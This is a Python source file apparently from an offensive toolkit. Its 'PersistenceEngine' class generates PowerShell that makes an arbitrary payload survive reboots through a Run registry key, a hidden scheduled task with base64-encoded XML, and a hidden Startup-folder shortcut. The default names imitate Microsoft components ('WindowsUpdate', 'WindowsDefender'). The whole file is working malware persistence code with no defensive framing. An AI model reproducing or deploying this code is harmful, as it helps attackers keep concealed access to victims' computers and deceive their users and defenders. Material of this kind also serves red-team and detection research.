"""
Persistence Mechanisms
Registry Run Keys, Scheduled Tasks, etc.
"""
import base64

class PersistenceEngine:
    def __init__(self):
        pass

    def generate_registry_persistence(self, payload_path, key_name="WindowsUpdate"):
        """
        Creates PowerShell script to add registry run key
        """
        ps_script = f"""
# Registry Persistence (HKCU - No admin required)
$RegPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
Set-ItemProperty -Path $RegPath -Name '{key_name}' -Value '{payload_path}'
Write-Host '[+] Persistence established: {key_name}'
"""
        return ps_script

    def generate_scheduled_task(self, payload_path, task_name="MicrosoftUpdater"):
        """
        Creates XML for Windows Scheduled Task
        """
        xml_template = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>{payload_path}</Command>
    </Exec>
  </Actions>
</Task>"""
        
        # Return PowerShell to create the task
        xml_b64 = base64.b64encode(xml_template.encode('utf-16le')).decode()
        ps_script = f"""
# Scheduled Task Persistence
$xml = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{xml_b64}'))
Register-ScheduledTask -TaskName '{task_name}' -Xml $xml -Force
Write-Host '[+] Scheduled Task created: {task_name}'
"""
        return ps_script

    def generate_startup_lnk(self, target_path, lnk_name="WindowsDefender"):
        """
        PowerShell to create LNK file in Startup folder
        """
        ps_script = f"""
# Startup Folder Persistence
$WshShell = New-Object -ComObject WScript.Shell
$Startup = [Environment]::GetFolderPath('Startup')
$Shortcut = $WshShell.CreateShortcut("$Startup\\{lnk_name}.lnk")
$Shortcut.TargetPath = '{target_path}'
$Shortcut.WorkingDirectory = Split-Path '{target_path}'
$Shortcut.WindowStyle = 7  # Hidden
$Shortcut.Save()
Write-Host '[+] Startup LNK created'
"""
        return ps_script
